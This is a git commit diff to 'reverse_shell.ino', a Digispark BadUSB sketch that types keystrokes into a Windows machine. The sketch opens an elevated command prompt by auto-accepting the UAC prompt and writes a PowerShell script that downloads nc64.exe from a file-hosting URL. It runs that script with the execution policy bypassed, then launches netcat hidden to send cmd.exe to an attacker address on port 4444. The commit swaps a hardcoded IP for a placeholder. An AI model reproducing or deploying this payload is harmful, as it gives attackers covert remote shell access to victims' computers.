e10e64456a061cda2eac1634c12ae3e25ff3c64f
Samuel T <68336568+Samuel20354@users.noreply.github.com>
2021-08-17 16:38:06 +0100

    Update reverse_shell.ino

--- Reverse Shell (NetCat)/reverse_shell/reverse_shell.ino
+++ Reverse Shell (NetCat)/reverse_shell/reverse_shell.ino
@@ -9,12 +9,14 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(400);
   DigiKeyboard.print("cmd");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(1000);
   DigiKeyboard.print("cd / & mkdir win & cd /win & echo (wget 'https://download1640.mediafire.com/sm7sxbe154fg/kjflwyvxh42vk0g/nc64.exe' -OutFile a.exe) > b.ps1 & powershell -ExecutionPolicy ByPass -File b.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(4000);
-  DigiKeyboard.print("START /min a.exe 172.16.4.38 4444 -e cmd.exe -d & exit");
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.print("START /min a.exe IP HERE 4444 -e cmd.exe -d & exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for(;;){ /*empty*/ }
 }
